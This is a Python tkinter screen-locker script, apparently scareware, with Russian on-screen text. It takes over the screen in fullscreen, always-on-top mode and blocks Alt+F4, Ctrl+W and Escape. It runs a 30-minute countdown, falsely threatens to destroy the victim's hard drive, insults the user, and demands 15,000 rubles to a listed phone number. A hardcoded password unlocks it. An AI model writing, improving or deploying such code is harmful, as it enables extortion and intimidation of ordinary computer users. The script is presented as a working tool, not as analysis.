import tkinter as tk
from tkinter import messagebox
import time

def check_password():
    if password_entry.get() == "123456789":
        root.destroy()
    else:
        messagebox.showerror("Ошибка", "ебать ты даун это неверный пароль!")
        password_entry.delete(0, tk.END)

def update_timer():
    global remaining_time
    if remaining_time > 0:
        mins, secs = divmod(remaining_time, 60)
        timer_label.config(text=f"{mins:02d}:{secs:02d}")
        remaining_time -= 1
        root.after(1000, update_timer)
        
        # Мигание текста
        if remaining_time % 2 == 0:
            warning_label.config(fg='red')
        else:
            warning_label.config(fg='black')
    else:
        timer_label.config(text="00:00")
        warning_label.config(text="Ваш жесткий диск сломан!", fg='red')

# Создаем главное окно
root = tk.Tk()
root.title(" ")

# Полноэкранный режим и блокировка интерфейса
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)  # Всегда поверх других окон
root.overrideredirect(True)  # Убираем рамку и кнопки управления

# Блокируем сочетания клавиш
root.bind('<Alt-F4>', lambda e: None)  # Блокируем Alt+F4
root.bind('<Control-w>', lambda e: None)  # Блокируем Ctrl+W
root.bind('<Escape>', lambda e: None)  # Блокируем Escape

# Блокируем меню Windows
try:
    root.wm_attributes('-toolwindow', True)
except:
    pass

root.configure(bg='black')

# Таймер обратного отсчета (30 минут)
remaining_time = 30 * 60

# Метка для таймера
timer_label = tk.Label(
    root,
    text="30:00",
    fg='red',
    bg='black',
    font=('Arial', 36, 'bold'),
    justify='center'
)
timer_label.pack(pady=(50, 0))

# Мигающая надпись под таймером
warning_label = tk.Label(
    root,
    text="По окончанию таймера ваш жесткий диск будет сломан",
    fg='red',
    bg='black',
    font=('Arial', 16, 'bold'),
    justify='center'
)
warning_label.pack(pady=(10, 30))

# Основное сообщение
label = tk.Label(
    root,
    text="Поздравляем, вы далбоёб!\nСкидывайте мне 15 000р на этот номер: +7 914 267 24 91 сбер",
    fg='red',
    bg='black',
    font=('Arial', 24, 'bold'),
    justify='center'
)
label.pack(pady=(0, 30))

# Поле для пароля
password_entry = tk.Entry(
    root,
    show="*",
    font=('Arial', 18),
    width=20
)
password_entry.pack(pady=(0, 20))

# Кнопка проверки
button = tk.Button(
    root,
    text="Проверить пароль",
    command=check_password,
    bg='black',
    fg='white',
    font=('Arial', 16),
    relief='flat'
)
button.pack()

# Запускаем таймер
update_timer()

root.mainloop()